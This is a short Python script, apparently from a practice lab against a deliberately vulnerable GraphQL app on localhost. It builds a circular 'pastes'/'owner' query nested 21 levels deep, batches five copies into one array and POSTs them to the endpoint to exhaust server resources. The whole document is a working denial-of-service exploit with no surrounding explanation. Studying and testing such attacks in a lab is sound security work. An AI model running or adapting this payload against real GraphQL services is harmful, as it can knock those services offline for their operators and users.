# Array-based Query Batching with Circular Queries

import requests

ARRAY_LENGTH = 5
FIELD_REPEAT = 10 

query = {"query":"query {"}
field_1_name = 'pastes'
field_2_name = 'owner'

count = 0
for _ in range(FIELD_REPEAT):
    count += 1
    closing_braces = '} ' * FIELD_REPEAT * 2  + '}'
    payload = "{0} {{ {1} {{ ".format(field_1_name, field_2_name)
    query["query"] += payload

    if count == FIELD_REPEAT:
      query["query"] += '__typename' + closing_braces

print('Query:', query['query'])
print('Query Repeated:', FIELD_REPEAT, 'times')
print('Query Depth:', FIELD_REPEAT * 2 + 1, 'levels')
print('Array Length:', ARRAY_LENGTH, 'elements')

queries = []
for _ in range(ARRAY_LENGTH):
  queries.append(query)

r = requests.post('http://localhost:5013/graphql', json=queries)

print(r.json())
